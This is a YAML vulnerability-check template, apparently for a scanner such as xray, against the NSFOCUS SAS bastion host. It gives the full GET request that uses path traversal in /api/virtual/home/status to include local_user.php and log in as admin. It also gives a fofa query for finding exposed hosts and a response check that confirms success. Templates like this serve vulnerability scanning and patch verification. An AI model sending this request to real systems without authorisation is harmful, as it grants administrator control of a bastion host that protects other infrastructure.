id: nsfocus-sas-localuser-login-anyuser

info:
  name: 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞
  author: peiqi
  severity: high
  verified: true
  description: |-
    绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录
    fofa: body="'/needUsbkey.php?username='"
  tags: nsfocus,login,bypass
  created: 2023/08/10

rules:
  r0:
    request:
      method: GET
      path: /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"status":200') &&
      response.raw_header.bcontains(b"NSFOCUS")
expression: r0()
